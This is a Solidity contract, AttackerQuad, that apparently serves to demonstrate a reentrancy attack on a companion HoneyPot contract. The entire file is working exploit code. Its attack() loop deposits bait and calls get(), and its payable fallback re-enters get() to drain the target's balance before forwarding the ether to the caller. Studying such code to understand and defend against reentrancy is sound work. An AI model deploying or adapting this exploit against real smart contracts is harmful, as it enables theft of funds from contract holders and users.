pragma solidity 0.4.13;

import "./HoneyPot.sol";

contract AttackerQuad {
    bool public attacking;

    function attack(address honeyPot) payable {
        uint before = this.balance;
        uint bait;
        while (0 < honeyPot.balance && 40000 <= msg.gas) {
            if (honeyPot.balance < this.balance) {
                bait = honeyPot.balance;
            } else {
                bait = this.balance;
            }
            HoneyPot(honeyPot).put.value(bait)();
            HoneyPot(honeyPot).get();
        }
        require(this.balance > before);
        msg.sender.transfer(this.balance);
    }

    function() payable {
        assembly {
            // The cheapest logging I could think of.
            log0(0, 0)
        }
        if (!attacking) {
            attacking = true;
            HoneyPot(msg.sender).get();
            attacking = false;
        }
    }
}